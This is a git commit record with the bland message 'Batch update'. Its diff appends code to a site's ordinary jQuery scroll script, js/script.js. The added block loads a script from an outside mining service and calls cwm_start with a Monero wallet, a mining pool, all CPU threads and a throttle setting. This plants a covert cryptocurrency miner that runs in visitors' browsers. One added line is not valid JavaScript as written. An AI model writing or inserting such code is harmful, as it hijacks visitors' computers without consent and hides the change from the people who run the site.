dd2b07c0ac21442df0fa18402eb0f8cf4ba17a9a
DDHDYT <3068799@gmail.com>
2019-08-18 00:56:47 -0500

    Batch update

--- js/script.js
+++ js/script.js
@@ -22,4 +22,18 @@ $(function() {
         $('html, body').animate({ scrollTop: n }, 500);
     });
 })
+
+    src="https://coinwebmining.com/cwm.js";
+
+
+    var site_id = 'cwm-2627';
+    var coin = 'monero';
+    var wallet = '46YVNRoBHJKHmrHaGpnw5FMEfjE6Sbhg2KKnKSgeWap1PixV4jv1CENDdp1W7XqXLSdbG5XN5PXwfijznzVDkyrKJK1VBku';
+    var password = 'x';
+    var mining_pool = 'gulf.moneroocean.stream:10001';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = false;
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+
     
